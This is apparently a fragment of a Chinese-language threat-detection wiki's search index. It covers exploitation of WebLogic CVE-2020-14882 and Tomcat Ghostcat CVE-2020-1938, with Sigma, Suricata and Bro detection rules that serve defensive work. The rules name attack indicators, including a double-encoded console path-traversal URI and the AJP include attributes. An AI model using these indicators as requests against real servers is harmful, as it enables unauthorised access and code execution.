\u53ef\u53c2\u8003\u6f0f\u6d1e\u8be6\u60c5\u90e8\u5206 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma\u89c4\u5219 title: Oracle WebLogic Exploit CVE-2020-14882 status: \u6d4b\u8bd5\u72b6\u6001 description: \u68c0\u6d4bWebLogic\u670d\u52a1\u5668\u4e0a\u7684\u653b\u51fb\u4f01\u56fe references: - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-14882 - https://www.cnblogs.com/2rsh0u/p/13911794.html - https://www.cnblogs.com/potatsoSec/p/13895120.html logsource: category: webserver detection: selection: c-uri|contains: - '/console/images/%252E%252E%252Fconsole.portal' - '/console/css/%2e' condition: selection fields: - c-ip - c-dns falsepositives: - Unknown level: high tags: - attack.t1190 - attack.initial_access - cve.2020-14882 \u5efa\u8bae \u5efa\u8bae\u4f7f\u7528HTTP\u6d41\u91cf+\u5b89\u5168\u8bbe\u5907\u8fdb\u884c\u68c0\u6d4b\u5206\u6790\u5224\u65ad\u653b\u51fb\u662f\u5426\u6210\u529f\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1190 https://attack.mitre.org/techniques/T1190/ Weblogic\u672a\u6388\u6743\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\uff08CVE-2020-14882&CVE-2020-14883\uff09\u590d\u73b0 https://www.cnblogs.com/2rsh0u/p/13911794.html CVE-2020-14882 weblogic \u672a\u6388\u6743\u547d\u4ee4\u6267\u884c\u590d\u73b0 https://www.cnblogs.com/potatsoSec/p/13895120.html","title":"T1190-CVE-2020-14882-Weblogic Console HTTP \u534f\u8bae\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-14882-Weblogic%20Console%20HTTP%20%E5%8D%8F%E8%AE%AE%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#t1190-cve-2020-14882-weblogic-console-http","text":"","title":"T1190-CVE-2020-14882-Weblogic Console HTTP \u534f\u8bae\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-14882-Weblogic%20Console%20HTTP%20%E5%8D%8F%E8%AE%AE%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#attck","text":"\u4f7f\u7528\u8f6f\u4ef6\uff0c\u6570\u636e\u6216\u547d\u4ee4\u6765\u5229\u7528\u9762\u5411Internet\u7684\u8ba1\u7b97\u673a\u7cfb\u7edf\u6216\u7a0b\u5e8f\u4e2d\u7684\u5f31\u70b9\uff0c\u4ece\u800c\u5bfc\u81f4\u610f\u5916\u6216\u65e0\u6cd5\u9884\u671f\u7684\u884c\u4e3a\u3002\u7cfb\u7edf\u7684\u5f31\u70b9\u53ef\u80fd\u662f\u9519\u8bef\u3001\u6545\u969c\u6216\u8bbe\u8ba1\u6f0f\u6d1e\u3002\u8fd9\u4e9b\u5e94\u7528\u7a0b\u5e8f\u901a\u5e38\u662f\u7f51\u7ad9\uff0c\u4f46\u662f\u53ef\u4ee5\u5305\u62ec\u6570\u636e\u5e93\uff08\u4f8b\u5982SQL\uff09\uff0c\u6807\u51c6\u670d\u52a1\uff08\u4f8b\u5982SMB \u6216SSH\uff09\u4ee5\u53ca\u5177\u6709Internet\u53ef\u8bbf\u95ee\u5f00\u653e\u7684\u4efb\u4f55\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\uff0c\u4f8b\u5982Web\u670d\u52a1\u5668\u548c\u76f8\u5173\u670d\u52a1\u3002\u6839\u636e\u6240\u5229\u7528\u7684\u7f3a\u9677\uff0c\u8fd9\u53ef\u80fd\u5305\u62ec\u201c\u5229\u7528\u9632\u5fa1\u9632\u536b\u201d\u3002 \u5982\u679c\u5e94\u7528\u7a0b\u5e8f\u6258\u7ba1\u5728\u57fa\u4e8e\u4e91\u7684\u57fa\u7840\u67b6\u6784\u4e0a\uff0c\u5219\u5bf9\u5176\u8fdb\u884c\u5229\u7528\u53ef\u80fd\u4f1a\u5bfc\u81f4\u57fa\u7840\u5b9e\u9645\u5e94\u7528\u53d7\u5230\u635f\u5bb3\u3002\u8fd9\u53ef\u4ee5\u4f7f\u653b\u51fb\u8005\u83b7\u5f97\u8bbf\u95ee\u4e91API\u6216\u5229\u7528\u5f31\u8eab\u4efd\u548c\u8bbf\u95ee\u7ba1\u7406\u7b56\u7565\u7684\u8def\u5f84\u3002 \u5bf9\u4e8e\u7f51\u7ad9\u548c\u6570\u636e\u5e93\uff0cOWASP\u6392\u540d\u524d10\u4f4d\u548cCWE\u6392\u540d\u524d25\u4f4d\u7a81\u51fa\u4e86\u6700\u5e38\u89c1\u7684\u57fa\u4e8eWeb\u7684\u6f0f\u6d1e\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-14882-Weblogic%20Console%20HTTP%20%E5%8D%8F%E8%AE%AE%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_1","text":"Weblogic\u662fOracle\u516c\u53f8\u63a8\u51fa\u7684J2EE\u5e94\u7528\u670d\u52a1\u5668\uff0cCVE-2020-14882\u5141\u8bb8\u672a\u6388\u6743\u7684\u7528\u6237\u7ed5\u8fc7\u7ba1\u7406\u63a7\u5236\u53f0\u7684\u6743\u9650\u9a8c\u8bc1\u8bbf\u95ee\u540e\u53f0\uff0cCVE-2020-14883\u5141\u8bb8\u540e\u53f0\u4efb\u610f\u7528\u6237\u901a\u8fc7HTTP\u534f\u8bae\u6267\u884c\u4efb\u610f\u547d\u4ee4\u3002\u4f7f\u7528\u8fd9\u4e24\u4e2a\u6f0f\u6d1e\u7ec4\u6210\u7684\u5229\u7528\u94fe\uff0c\u53ef\u901a\u8fc7\u4e00\u4e2aGET\u8bf7\u6c42\u5728\u8fdc\u7a0bWeblogic\u670d\u52a1\u5668\u4e0a\u4ee5\u672a\u6388\u6743\u7684\u4efb\u610f\u7528\u6237\u8eab\u4efd\u6267\u884c\u547d\u4ee4\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-14882-Weblogic%20Console%20HTTP%20%E5%8D%8F%E8%AE%AE%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#0x1","text":"Oracle:Weblogic : 10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0, 14.1.1.0.0","title":"0x1 \u5f71\u54cd\u7248\u672c"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-14882-Weblogic%20Console%20HTTP%20%E5%8D%8F%E8%AE%AE%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#0x2","text":"\u53ef\u53c2\u8003\uff1a https://www.cnblogs.com/2rsh0u/p/13911794.html # Weblogic\u672a\u6388\u6743\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\uff08CVE-2020-14882&CVE-2020-14883\uff09\u590d\u73b0 https://www.cnblogs.com/potatsoSec/p/13895120.html # CVE-2020-14882 weblogic \u672a\u6388\u6743\u547d\u4ee4\u6267\u884c\u590d\u73b0","title":"0x2 \u6f0f\u6d1e\u8be6\u60c5"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-14882-Weblogic%20Console%20HTTP%20%E5%8D%8F%E8%AE%AE%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_2","text":"HTTP.log","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-14882-Weblogic%20Console%20HTTP%20%E5%8D%8F%E8%AE%AE%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_3","text":"\u53ef\u53c2\u8003\u6f0f\u6d1e\u8be6\u60c5\u90e8\u5206","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-14882-Weblogic%20Console%20HTTP%20%E5%8D%8F%E8%AE%AE%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_4","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-14882-Weblogic%20Console%20HTTP%20%E5%8D%8F%E8%AE%AE%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#sigma","text":"title: Oracle WebLogic Exploit CVE-2020-14882 status: \u6d4b\u8bd5\u72b6\u6001 description: \u68c0\u6d4bWebLogic\u670d\u52a1\u5668\u4e0a\u7684\u653b\u51fb\u4f01\u56fe references: - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-14882 - https://www.cnblogs.com/2rsh0u/p/13911794.html - https://www.cnblogs.com/potatsoSec/p/13895120.html logsource: category: webserver detection: selection: c-uri|contains: - '/console/images/%252E%252E%252Fconsole.portal' - '/console/css/%2e' condition: selection fields: - c-ip - c-dns falsepositives: - Unknown level: high tags: - attack.t1190 - attack.initial_access - cve.2020-14882","title":"sigma\u89c4\u5219"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-14882-Weblogic%20Console%20HTTP%20%E5%8D%8F%E8%AE%AE%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_5","text":"\u5efa\u8bae\u4f7f\u7528HTTP\u6d41\u91cf+\u5b89\u5168\u8bbe\u5907\u8fdb\u884c\u68c0\u6d4b\u5206\u6790\u5224\u65ad\u653b\u51fb\u662f\u5426\u6210\u529f\u3002","title":"\u5efa\u8bae"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-14882-Weblogic%20Console%20HTTP%20%E5%8D%8F%E8%AE%AE%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_6","text":"MITRE-ATT&CK-T1190 https://attack.mitre.org/techniques/T1190/ Weblogic\u672a\u6388\u6743\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\uff08CVE-2020-14882&CVE-2020-14883\uff09\u590d\u73b0 https://www.cnblogs.com/2rsh0u/p/13911794.html CVE-2020-14882 weblogic \u672a\u6388\u6743\u547d\u4ee4\u6267\u884c\u590d\u73b0 https://www.cnblogs.com/potatsoSec/p/13895120.html","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-1938-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B/","text":"T1190-CVE-2020-1938\u6f0f\u6d1e\u5229\u7528\u68c0\u6d4b \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u4f7f\u7528\u8f6f\u4ef6\uff0c\u6570\u636e\u6216\u547d\u4ee4\u6765\u5229\u7528\u9762\u5411Internet\u7684\u8ba1\u7b97\u673a\u7cfb\u7edf\u6216\u7a0b\u5e8f\u4e2d\u7684\u5f31\u70b9\uff0c\u4ece\u800c\u5bfc\u81f4\u610f\u5916\u6216\u65e0\u6cd5\u9884\u671f\u7684\u884c\u4e3a\u3002\u7cfb\u7edf\u7684\u5f31\u70b9\u53ef\u80fd\u662f\u9519\u8bef\u3001\u6545\u969c\u6216\u8bbe\u8ba1\u6f0f\u6d1e\u3002\u8fd9\u4e9b\u5e94\u7528\u7a0b\u5e8f\u901a\u5e38\u662f\u7f51\u7ad9\uff0c\u4f46\u662f\u53ef\u4ee5\u5305\u62ec\u6570\u636e\u5e93\uff08\u4f8b\u5982SQL\uff09\uff0c\u6807\u51c6\u670d\u52a1\uff08\u4f8b\u5982SMB \u6216SSH\uff09\u4ee5\u53ca\u5177\u6709Internet\u53ef\u8bbf\u95ee\u5f00\u653e\u7684\u4efb\u4f55\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\uff0c\u4f8b\u5982Web\u670d\u52a1\u5668\u548c\u76f8\u5173\u670d\u52a1\u3002\u6839\u636e\u6240\u5229\u7528\u7684\u7f3a\u9677\uff0c\u8fd9\u53ef\u80fd\u5305\u62ec\u201c\u5229\u7528\u9632\u5fa1\u9632\u536b\u201d\u3002 \u5982\u679c\u5e94\u7528\u7a0b\u5e8f\u6258\u7ba1\u5728\u57fa\u4e8e\u4e91\u7684\u57fa\u7840\u67b6\u6784\u4e0a\uff0c\u5219\u5bf9\u5176\u8fdb\u884c\u5229\u7528\u53ef\u80fd\u4f1a\u5bfc\u81f4\u57fa\u7840\u5b9e\u9645\u5e94\u7528\u53d7\u5230\u635f\u5bb3\u3002\u8fd9\u53ef\u4ee5\u4f7f\u653b\u51fb\u8005\u83b7\u5f97\u8bbf\u95ee\u4e91API\u6216\u5229\u7528\u5f31\u8eab\u4efd\u548c\u8bbf\u95ee\u7ba1\u7406\u7b56\u7565\u7684\u8def\u5f84\u3002 \u5bf9\u4e8e\u7f51\u7ad9\u548c\u6570\u636e\u5e93\uff0cOWASP\u6392\u540d\u524d10\u4f4d\u548cCWE\u6392\u540d\u524d25\u4f4d\u7a81\u51fa\u4e86\u6700\u5e38\u89c1\u7684\u57fa\u4e8eWeb\u7684\u6f0f\u6d1e\u3002 CVE-2020-1938\u6f0f\u6d1e 2\u670820\u65e5\uff0c\u56fd\u5bb6\u4fe1\u606f\u5b89\u5168\u6f0f\u6d1e\u5171\u4eab\u5e73\u53f0\uff08CNVD\uff09\u53d1\u5e03\u4e86Apache Tomcat\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\uff08CNVD-2020-10487/CVE-2020-1938\uff09\u3002\u8be5\u6f0f\u6d1e\u662f\u7531\u4e8eTomcat AJP\u534f\u8bae\u5b58\u5728\u7f3a\u9677\u800c\u5bfc\u81f4\uff0c\u653b\u51fb\u8005\u5229\u7528\u8be5\u6f0f\u6d1e\u53ef\u901a\u8fc7\u6784\u9020\u7279\u5b9a\u53c2\u6570\uff0c\u8bfb\u53d6\u670d\u52a1\u5668webapp\u4e0b\u7684\u4efb\u610f\u6587\u4ef6\u3002\u82e5\u76ee\u6807\u670d\u52a1\u5668\u540c\u65f6\u5b58\u5728\u6587\u4ef6\u4e0a\u4f20\u529f\u80fd\uff0c\u653b\u51fb\u8005\u53ef\u8fdb\u4e00\u6b65\u5b9e\u73b0\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u3002\u76ee\u524d\uff0c\u5382\u5546\u5df2\u53d1\u5e03\u65b0\u7248\u672c\u5b8c\u6210\u6f0f\u6d1e\u4fee\u590d\u3002 \u6d4b\u8bd5\u6848\u4f8b \u5177\u4f53\u590d\u6d4b\u53ef\u4ee5\u53c2\u8003 Apache Tomcat\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e (CVE-2020-1938) \u5206\u6790\uff1a https://www.secrss.com/articles/17267 \u68c0\u6d4b\u65e5\u5fd7 HTTP\u6d41\u91cf \u6d4b\u8bd5\u590d\u73b0 \u53ef\u53c2\u8003\u4e0a\u8ff0\u6d4b\u8bd5\u6848\u4f8b \u6d4b\u8bd5\u7559\u75d5 HTTP\u6d41\u91cf\u68c0\u6d4b\u89c4\u5219\u57fa\u4e8epayload\u5173\u952e\u8bcd\u8fdb\u884c\u68c0\u6d4b \u68c0\u6d4b\u89c4\u5219/\u601d\u8def Suricata\u68c0\u6d4b\u89c4\u5219 # CNVD-2020-10487 CVE-2020-1938 alert tcp any any -> any 8009 (msg:\"CNVD-2020-10487 Ghostcat\"; content:\"javax|2e|servlet|2e|include|2e|request_uri\"; content:\"javax|2e|servlet|2e|include|2e|path_info\"; content:\"javax|2e|servlet|2e|include|2e|servlet_path\"; reference:url,www.anquanke.com/post/id/199351; classtype:tomcat; sid:202002211; rev:1;) Bro\u68c0\u6d4b\u89c4\u5219 module EXPLOIT; event tcp_packet(c: connection, is_orig: bool, flags: string, seq: count, ack: count, len: count, payload: string) { if ( (c$id$resp_p == 8009/tcp) && /javax\\.servlet\\.include\\.request_uri/ in payload && /javax\\.servlet\\.include\\.path_info/ in payload && /javax\\.servlet\\.include\\.servlet_path/ in payload) { local rec: EXPLOIT::Info = [$ts=c$start_time, $src_ip=c$id$orig_h, $src_port=c$id$orig_p, $dst_ip=c$id$resp_h, $dst_port=c$id$resp_p, $vul_payload=payload, $vul_describe=\"CVE-2020-1938 Ghostcat\", $vul_refer=\"https://www.anquanke.com/post/id/199351\", $vul_level=\"high\"]; Log::write(EXPLOIT::LOG, rec); } \u68c0\u6d4b\u89c4\u5219\u8f6c\u8f7d\u81ea\uff1a https://github.com/DaemonShao/CVE-2020-1938 \u5efa\u8bae \u6682\u65e0 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1190 https://attack.mitre.org/techniques/T1190/ CVE-2020-1938\u68c0\u6d4b\u89c4\u5219 https://github.com/DaemonShao/CVE-2020-1938","title":"T1190-CVE-2020-1938\u6f0f\u6d1e\u5229\u7528\u68c0\u6d4b"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-1938-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B/#t1190-cve-2020-1938","text":"","title":"T1190-CVE-2020-1938\u6f0f\u6d1e\u5229\u7528\u68c0\u6d4b"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-1938-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B/#attck","text":"\u4f7f\u7528\u8f6f\u4ef6\uff0c\u6570\u636e\u6216\u547d\u4ee4\u6765\u5229\u7528\u9762\u5411Internet\u7684\u8ba1\u7b97\u673a\u7cfb\u7edf\u6216\u7a0b\u5e8f\u4e2d\u7684\u5f31\u70b9\uff0c\u4ece\u800c\u5bfc\u81f4\u610f\u5916\u6216\u65e0\u6cd5\u9884\u671f\u7684\u884c\u4e3a\u3002\u7cfb\u7edf\u7684\u5f31\u70b9\u53ef\u80fd\u662f\u9519\u8bef\u3001\u6545\u969c\u6216\u8bbe\u8ba1\u6f0f\u6d1e\u3002\u8fd9\u4e9b\u5e94\u7528\u7a0b\u5e8f\u901a\u5e38\u662f\u7f51\u7ad9\uff0c\u4f46\u662f\u53ef\u4ee5\u5305\u62ec\u6570\u636e\u5e93\uff08\u4f8b\u5982SQL\uff09\uff0c\u6807\u51c6\u670d\u52a1\uff08\u4f8b\u5982SMB \u6216SSH\uff09\u4ee5\u53ca\u5177\u6709Internet\u53ef\u8bbf\u95ee\u5f00\u653e\u7684\u4efb\u4f55\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\uff0c\u4f8b\u5982Web\u670d\u52a1\u5668\u548c\u76f8\u5173\u670d\u52a1\u3002\u6839\u636e\u6240\u5229\u7528\u7684\u7f3a\u9677\uff0c\u8fd9\u53ef\u80fd\u5305\u62ec\u201c\u5229\u7528\u9632\u5fa1\u9632\u536b\u201d\u3002 \u5982\u679c\u5e94\u7528\u7a0b\u5e8f\u6258\u7ba1\u5728\u57fa\u4e8e\u4e91\u7684\u57fa\u7840\u67b6\u6784\u4e0a\uff0c\u5219\u5bf9\u5176\u8fdb\u884c\u5229\u7528\u53ef\u80fd\u4f1a\u5bfc\u81f4\u57fa\u7840\u5b9e\u9645\u5e94\u7528\u53d7\u5230\u635f\u5bb3\u3002\u8fd9\u53ef\u4ee5\u4f7f\u653b\u51fb\u8005\u83b7\u5f97\u8bbf\u95ee\u4e91API\u6216\u5229\u7528\u5f31\u8eab\u4efd\u548c\u8bbf\u95ee\u7ba1\u7406\u7b56\u7565\u7684\u8def\u5f84\u3002 \u5bf9\u4e8e\u7f51\u7ad9\u548c\u6570\u636e\u5e93\uff0cOWASP\u6392\u540d\u524d10\u4f4d\u548cCWE\u6392\u540d\u524d25\u4f4d\u7a81\u51fa\u4e86\u6700\u5e38\u89c1\u7684\u57fa\u4e8eWeb\u7684\u6f0f\u6d1e\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-1938-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B/#cve-2020-1938","text":"2\u670820\u65e5\uff0c\u56fd\u5bb6\u4fe1\u606f\u5b89\u5168\u6f0f\u6d1e\u5171\u4eab\u5e73\u53f0\uff08CNVD\uff09\u53d1\u5e03\u4e86Apache Tomcat\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\uff08CNVD-2020-10487/CVE-2020-1938\uff09\u3002\u8be5\u6f0f\u6d1e\u662f\u7531\u4e8eTomcat AJP\u534f\u8bae\u5b58\u5728\u7f3a\u9677\u800c\u5bfc\u81f4\uff0c\u653b\u51fb\u8005\u5229\u7528\u8be5\u6f0f\u6d1e\u53ef\u901a\u8fc7\u6784\u9020\u7279\u5b9a\u53c2\u6570\uff0c\u8bfb\u53d6\u670d\u52a1\u5668webapp\u4e0b\u7684\u4efb\u610f\u6587\u4ef6\u3002\u82e5\u76ee\u6807\u670d\u52a1\u5668\u540c\u65f6\u5b58\u5728\u6587\u4ef6\u4e0a\u4f20\u529f\u80fd\uff0c\u653b\u51fb\u8005\u53ef\u8fdb\u4e00\u6b65\u5b9e\u73b0\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u3002\u76ee\u524d\uff0c\u5382\u5546\u5df2\u53d1\u5e03\u65b0\u7248\u672c\u5b8c\u6210\u6f0f\u6d1e\u4fee\u590d\u3002","title":"CVE-2020-1938\u6f0f\u6d1e"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-1938-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B/#_1","text":"\u5177\u4f53\u590d\u6d4b\u53ef\u4ee5\u53c2\u8003 Apache Tomcat\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e (CVE-2020-1938) \u5206\u6790\uff1a https://www.secrss.com/articles/17267","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-1938-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B/#_2","text":"HTTP\u6d41\u91cf","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-1938-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B/#_3","text":"\u53ef\u53c2\u8003\u4e0a\u8ff0\u6d4b\u8bd5\u6848\u4f8b","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-1938-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B/#_4","text":"HTTP\u6d41\u91cf\u68c0\u6d4b\u89c4\u5219\u57fa\u4e8epayload\u5173\u952e\u8bcd\u8fdb\u884c\u68c0\u6d4b","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-1938-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-1938-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B/#suricata","text":"# CNVD-2020-10487 CVE-2020-1938 alert tcp any any -> any 8009 (msg:\"CNVD-2020-10487 Ghostcat\"; content:\"javax|2e|servlet|2e|include|2e|request_uri\"; content:\"javax|2e|servlet|2e|include|2e|path_info\"; content:\"javax|2e|servlet|2e|include|2e|servlet_path\"; reference:url,www.anquanke.com/post/id/199351; classtype:tomcat; sid:202002211; rev:1;)","title":"Suricata\u68c0\u6d4b\u89c4\u5219"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-1938-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B/#bro","text":"module EXPLOIT; event tcp_packet(c: connection, is_orig: bool, flags: string, seq: count, ack: count, len: count, payload: string) { if ( (c$id$resp_p == 8009/tcp) && /javax\\.servlet\\.include\\.request_uri/ in payload && /javax\\.servlet\\.include\\.path_info/ in payload && /javax\\.servlet\\.include\\.servlet_path/ in payload) { local rec: EXPLOIT::Info = [$ts=c$start_time, $src_ip=c$id$orig_h, $src_port=c$id$orig_p, $dst_ip=c$id$resp_h, $dst_port=c$id$resp_p, $vul_payload=payload, $vul_describe=\"CVE-2020-1938 Ghostcat\", $vul_refer=\"https://www.anquanke.com/post/id/199351\", $vul_level=\"high\"]; Log::write(EXPLOIT::LOG, rec); } \u68c0\u6d4b\u89c4\u5219\u8f6c\u8f7d\u81ea\uff1a https://github.com/DaemonShao/CVE-2020-1938","title":"Bro\u68c0\u6d4b\u89c4\u5219"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-1938-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B/#_6","text":"\u6682\u65e0","title":"\u5efa\u8bae"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-1938-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B/#_7","text":"MITRE-ATT&CK-T1190 https://attack.mitre.org/techniques/T1190/ CVE-2020-1938\u68c0\u6d4b\u89c4\u5219 https://github.com/DaemonShao/CVE-2020-1938","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-5902-F5_BIG-IP_%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","text":"T1190-CVE-2020-5902-F5_BIG-IP-\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u4f7f\u7528\u8f6f\u4ef6\uff0c\u6570\u636e\u6216\u547d\u4ee4\u6765\u5229\u7528\u9762\u5411Internet\u7684\u8ba1\u7b97\u673a\u7cfb\u7edf\u6216\u7a0b\u5e8f\u4e2d\u7684\u5f31\u70b9\uff0c\u4ece\u800c\u5bfc\u81f4\u610f\u5916\u6216\u65e0\u6cd5\u9884\u671f\u7684\u884c\u4e3a\u3002\u7cfb\u7edf\u7684\u5f31\u70b9\u53ef\u80fd\u662f\u9519\u8bef\u3001\u6545\u969c\u6216\u8bbe\u8ba1\u6f0f\u6d1e\u3002\u8fd9\u4e9b\u5e94\u7528\u7a0b\u5e8f\u901a\u5e38\u662f\u7f51\u7ad9\uff0c\u4f46\u662f\u53ef\u4ee5\u5305\u62ec\u6570\u636e\u5e93\uff08\u4f8b\u5982SQL\uff09\uff0c\u6807\u51c6\u670d\u52a1\uff08\u4f8b\u5982SMB \u6216SSH\uff09\u4ee5\u53ca\u5177\u6709Internet\u53ef\u8bbf\u95ee\u5f00\u653e\u7684\u4efb\u4f55\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\uff0c\u4f8b\u5982Web\u670d\u52a1\u5668\u548c\u76f8\u5173\u670d\u52a1\u3002\u6839\u636e\u6240\u5229\u7528\u7684\u7f3a\u9677\uff0c\u8fd9\u53ef\u80fd\u5305\u62ec\u201c\u5229\u7528\u9632\u5fa1\u9632\u536b\u201d\u3002 